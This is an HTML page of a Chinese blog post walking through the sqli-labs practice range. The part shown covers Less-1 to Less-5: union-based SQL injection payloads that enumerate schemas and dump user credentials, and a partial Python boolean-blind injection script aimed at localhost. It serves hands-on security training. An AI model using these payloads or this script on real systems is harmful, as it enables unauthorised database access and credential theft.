<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>sqli-labs(已完成) - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="sqli-labs(已完成)" />
<meta property="og:description" content="sqli-labs靶场" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mi3aka.eu.org/sqli-labs/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-25T17:45:11+00:00" />
<meta property="article:modified_time" content="2021-10-25T17:45:11+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>

<meta name="twitter:title" content="sqli-labs(已完成)"/>
<meta name="twitter:description" content="sqli-labs靶场"/>
<meta name="application-name" content="Mi3aka&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/sqli-labs/" /><link rel="prev" href="https://mi3aka.eu.org/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/" /><link rel="next" href="https://mi3aka.eu.org/vulnhub-beelzebub/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "sqli-labs(已完成)",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/mi3aka.eu.org\/sqli-labs\/"
        },"genre": "posts","wordcount":  10819 ,
        "url": "https:\/\/mi3aka.eu.org\/sqli-labs\/","datePublished": "2021-10-25T17:45:11+00:00","dateModified": "2021-10-25T17:45:11+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Mi3aka"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">sqli-labs(已完成)</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author">
                    <a href="/" title="Author" rel="author" class="author">Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>靶场</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-10-25">2021-10-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 10819 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 22 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#basic-challenges">Basic Challenges</a>
      <ul>
        <li><a href="#less-1">Less-1</a></li>
        <li><a href="#less-2">Less-2</a></li>
        <li><a href="#less-3">Less-3</a></li>
        <li><a href="#less-4">Less-4</a></li>
        <li><a href="#less-5">Less-5</a></li>
        <li><a href="#less-6">Less-6</a></li>
        <li><a href="#less-7">Less-7</a></li>
        <li><a href="#less-8">Less-8</a></li>
        <li><a href="#less-9">Less-9</a></li>
        <li><a href="#less-10">Less-10</a></li>
        <li><a href="#less-11">Less-11</a></li>
        <li><a href="#less-12">Less-12</a></li>
        <li><a href="#less-13">Less-13</a></li>
        <li><a href="#less-14">Less-14</a></li>
        <li><a href="#less-15">Less-15</a></li>
        <li><a href="#less-16">Less-16</a></li>
        <li><a href="#less-17">Less-17</a></li>
        <li><a href="#less-18">Less-18</a></li>
        <li><a href="#less-19">Less-19</a></li>
        <li><a href="#less-20">Less-20</a></li>
        <li><a href="#less-21">Less-21</a></li>
        <li><a href="#less-22">Less-22</a></li>
      </ul>
    </li>
    <li><a href="#advanced-injections">Advanced Injections</a>
      <ul>
        <li><a href="#less-23">Less-23</a></li>
        <li><a href="#less-24">Less-24</a></li>
        <li><a href="#less-25">Less-25</a></li>
        <li><a href="#less-25a">Less-25a</a></li>
        <li><a href="#less-26">Less-26</a></li>
        <li><a href="#less-26a">Less-26a</a></li>
        <li><a href="#less-27">Less-27</a></li>
        <li><a href="#less-27a">Less-27a</a></li>
        <li><a href="#less-28">Less-28</a></li>
        <li><a href="#less-28a">Less-28a</a></li>
        <li><a href="#less-29">Less-29</a></li>
        <li><a href="#less-30">Less-30</a></li>
        <li><a href="#less-31">Less-31</a></li>
        <li><a href="#less-32">Less-32</a></li>
        <li><a href="#less-33">Less-33</a></li>
        <li><a href="#less-34">Less-34</a></li>
        <li><a href="#less-35">Less-35</a></li>
        <li><a href="#less-36">Less-36</a></li>
        <li><a href="#less-37">Less-37</a></li>
      </ul>
    </li>
    <li><a href="#stacked-injections">Stacked Injections</a>
      <ul>
        <li><a href="#less-38">Less-38</a></li>
        <li><a href="#less-39">Less-39</a></li>
        <li><a href="#less-40">Less-40</a></li>
        <li><a href="#less-41">Less-41</a></li>
        <li><a href="#less-42">Less-42</a></li>
        <li><a href="#less-43">Less-43</a></li>
        <li><a href="#less-44">Less-44</a></li>
        <li><a href="#less-45">Less-45</a></li>
        <li><a href="#less-46">Less-46</a></li>
        <li><a href="#less-47">Less-47</a></li>
        <li><a href="#less-48">Less-48</a></li>
        <li><a href="#less-49">Less-49</a></li>
        <li><a href="#less-50">Less-50</a></li>
        <li><a href="#less-51">Less-51</a></li>
        <li><a href="#less-52">Less-52</a></li>
        <li><a href="#less-53">Less-53</a></li>
      </ul>
    </li>
    <li><a href="#challenges">Challenges</a>
      <ul>
        <li><a href="#less-54">Less-54</a></li>
        <li><a href="#less-55">Less-55</a></li>
        <li><a href="#less-56">Less-56</a></li>
        <li><a href="#less-57">Less-57</a></li>
        <li><a href="#less-58">Less-58</a></li>
        <li><a href="#less-59">Less-59</a></li>
        <li><a href="#less-60">Less-60</a></li>
        <li><a href="#less-61">Less-61</a></li>
        <li><a href="#less-62">Less-62</a></li>
        <li><a href="#less-63">Less-63</a></li>
        <li><a href="#less-64">Less-64</a></li>
        <li><a href="#less-65">Less-65</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>在mysql中有一个系统数据库<code>information_schema</code>存储着所有的数据库的相关信息</p>
<p>查询数据库名</p>
<p><code>select schema_name from information_schema.schemata</code></p>
<p>查询数据表</p>
<p><code>select table_name from information_schema.tables where table_schema='xxx'</code></p>
<p>查询列</p>
<p><code>select column_name from information_schema.columns where table_name='xxx'</code></p>
<h2 id="basic-challenges">Basic Challenges</h2>
<h3 id="less-1">Less-1</h3>
<p>传入<code>?id=1'</code>得到报错<code>''1'' LIMIT 0,1'</code>,说明原本的sql语句为<code>'$id' LIMIT 0,1</code>,但是此时<code>$id</code>多了一个<code>'</code>造成了<code>'</code>没有完全匹配,利用注释将后面多余的<code>'</code>去除</p>
<p>传入<code>?id=1'--%20</code>此时的sql语句变为<code>'1'-- LIMIT 0,1</code>此时后面的<code>LIMIT 0,1</code>已经被注释掉了,同时<code>'</code>已经完全匹配所以sql语句正确执行</p>
<p>使用<code>order by</code>进行排序,<code>?id=1' order by 4--%20</code>当传入4时报错<code>Unknown column '4' in 'order clause'</code>说明只有3列数据</p>
<p>利用<code>group_concat</code>列出所有数据库名</p>
<p><code>?id=-1' UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000022.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000022.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000022.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000022.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20000022.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20000022.png" /></p>
<p>列出表名<code>?id=-1' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000357.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000357.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000357.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20000357.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20000357.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20000357.png" /></p>
<p>查询列<code>?id=-1' UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001050.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001050.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001050.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001050.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20001050.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20001050.png" /></p>
<p>列出所有数据<code>?id=-1' UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001710.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001710.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001710.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20001710.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20001710.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20001710.png" /></p>
<h3 id="less-2">Less-2</h3>
<p>传入<code>?id=1'</code>报错<code>'' LIMIT 0,1'</code>,传入<code>?id='1</code>报错<code>''1 LIMIT 0,1'</code>,推测sql语句为<code>$id LIMIT 0,1</code>(没有<code>'</code>)</p>
<p>爆破库名<code>?id=-1 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20</code></p>
<p>爆破表名<code>?id=-1 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20</code></p>
<p>查询列<code>?id=-1 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20</code></p>
<p>列出所有数据<code>?id=-1 UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20</code></p>
<h3 id="less-3">Less-3</h3>
<p>传入<code>?id=1'</code>报错<code>''1'') LIMIT 0,1'</code>,推测sql语句为<code>('$id') LIMIT 0,1</code></p>
<p>爆破库名<code>?id=-1') UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20</code></p>
<p>爆破表名<code>?id=-1') UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20</code></p>
<p>查询列<code>?id=-1') UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20</code></p>
<p>列出所有数据<code>?id=-1') UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20</code></p>
<h3 id="less-4">Less-4</h3>
<p>传入<code>?id=1'</code>无回显,传入<code>?id-1&quot;</code>报错<code>&quot;1&quot;&quot;) LIMIT 0,1</code>,推测sql语句为<code>(&quot;$id&quot;) LIMIT 0,1</code></p>
<p>爆破库名<code>?id=-1&quot;) UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20</code></p>
<p>爆破表名<code>?id=-1&quot;) UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20</code></p>
<p>查询列<code>?id=-1&quot;) UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20</code></p>
<p>列出所有数据<code>?id=-1&quot;) UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20</code></p>
<h3 id="less-5">Less-5</h3>
<p>传入<code>?id=1'</code>报错<code>''1'' LIMIT 0,1'</code>,而传入<code>?id=1' or 1=1--%20</code>则会返回<code>You are in</code>,不返回查询结果因此这里可以进行布尔盲注</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#二分法爆破</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/Less-5/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_length</span><span class="p">():</span>  <span class="c1"># 长度为8</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39; or length(database())=</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;You are in&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_name</span><span class="p">(</span><span class="n">database_length</span><span class="p">):</span>  <span class="c1"># security</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">database_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39; or ascii(substr(database(),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;You are in&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_table_name</span><span class="p">():</span>  <span class="c1"># users,uagents,emails,referers</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
